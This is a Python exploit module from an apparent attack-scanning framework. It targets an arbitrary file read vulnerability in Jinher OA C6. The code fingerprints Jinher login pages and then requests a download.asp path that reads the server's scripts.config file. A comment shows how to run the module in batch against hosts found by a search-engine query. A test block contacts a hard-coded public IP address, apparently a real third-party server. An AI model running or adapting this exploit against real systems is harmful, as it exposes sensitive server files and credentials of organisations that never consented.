# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:19

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# app="Jinher-OA"
# python batch.py -m exploit.scripts.OA.Jinher.unauth_readfile -cs -fs "app=\"Jinher-OA\""

class Script(BaseScript):
    name = 'Jinher'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/scripts.config']
        # 相关信息
        self.info = '金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and (('Jhsoft.Web.login' in text and 'PassWord.aspx' in text) or 'js/passwordcommon.js' in text or 'js/passwordnew.js' in text or 'jinher network' in text or ('c6/jhsoft.web.login' in text and 'closewindownoask' in text)):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://125.64.61.123:8088/C6/image/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)